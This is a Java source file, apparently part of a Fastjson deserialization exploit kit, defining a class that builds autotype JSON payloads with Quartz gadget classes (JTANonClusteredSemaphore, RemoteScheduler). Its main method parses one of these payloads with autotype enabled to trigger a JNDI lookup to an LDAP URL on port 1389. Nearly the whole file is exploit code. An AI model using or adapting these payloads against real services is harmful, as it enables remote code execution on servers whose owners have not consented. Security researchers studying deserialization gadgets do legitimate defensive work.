package fastjsonExp;

import org.quartz.impl.jdbcjobstore.JTANonClusteredSemaphore;
import utils.FastjsonVersionCtr;
import utils.StringUtils;

import java.lang.reflect.Method;

/**
 * not yet
 * still work at fastjson 1.2.60
 */

public class EXP4quartz {

    public String JNDI_URL = "";
    public String payload = "{\"@type\":\"org.quartz.impl.jdbcjobstore.JTANonClusteredSemaphore\",\"transaction\":null,\"transactionManagerJNDIName\":\"replace_here\"}";
    //public String payload = "{\"@type\":\"org.quartz.ee.jta.UserTransactionHelper\",\"userTxURL\":\"replace_here\",\"UserTransactionWithContext\":{\"$ref\":\"$.UserTransactionWithContext\"}}";
    public String payload2 = "{\"@type\":\"org.quartz.impl.RemoteScheduler\",\"rmiHost\":\"127.0.0.1\",\"rmiPort\":1389,\"schedId\":\"run\",\"RemoteScheduler\":null}";
    public  void actual_fun(String url) throws Exception {
        JTANonClusteredSemaphore jtaNonClusteredSemaphore = new JTANonClusteredSemaphore();
        jtaNonClusteredSemaphore.setTransactionManagerJNDIName(url);
        Method m = JTANonClusteredSemaphore.class.getDeclaredMethod("getTransaction");
        m.setAccessible(true);
        m.invoke(jtaNonClusteredSemaphore);
    }
    public  void actual_fun() throws Exception {
        if(!StringUtils.isNull(this.JNDI_URL)){
            this.actual_fun(this.JNDI_URL);
        }
    }
    public EXP4quartz(){}
    public EXP4quartz(String uri){
        this.JNDI_URL = uri;
        //String encodeUri = Base64.encodeToString(uri.getBytes());
        this.payload = this.payload.replace("replace_here",uri);

    }
    public String getPayload(){
        System.out.println(this.payload2);
        return this.payload2;
    }
    public static void main(String[] args) throws Exception{
        FastjsonVersionCtr myFastjson = new FastjsonVersionCtr("1.2.30");
        myFastjson.mySetAutoType(true);
        EXP4quartz exp = new EXP4quartz("ldap://127.0.0.1:1389/run");
        myFastjson.myParseObject(exp.getPayload());
        //exp.actual_fun();
        myFastjson.clear();
    }
}
